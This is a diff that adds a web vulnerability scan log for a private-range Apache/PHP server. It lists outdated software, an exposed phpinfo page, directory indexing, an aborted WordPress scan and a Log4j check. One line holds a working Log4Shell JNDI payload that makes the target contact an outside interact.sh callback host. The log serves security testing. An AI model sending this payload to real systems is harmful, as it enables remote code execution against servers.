@@ -1,0 +1,14 @@
++ Server: Apache/2.2.8 (Ubuntu) DAV/2
++Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ /phpinfo.php: Output from the phpinfo() function was found.
++ OSVDB-3268: /test/: Directory indexing found.
+
+Scan Aborted: The remote website is up, but does not seem to be running WordPress.
+
+Checking for Log4j RCE CVE-2021-44228.
+URL: http://172.23.101.159
+Targets do not seem to be vulnerable.
+OSVDB-3233: /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+OSVDB-3268: /icons/: Directory indexing found.\r\n+ OSVDB-3233: /icons/README: Apache default file found.
+PAYLOAD: ${jndi:ldap://172.23.101.159.650rr10199fj4w0g8km77w94o8911498u.interact.sh/64l2j30}
+Server may leak inodes via ETags, header found with file /phpMyAdmin/ChangeLog, inode: 92462, size: 40540
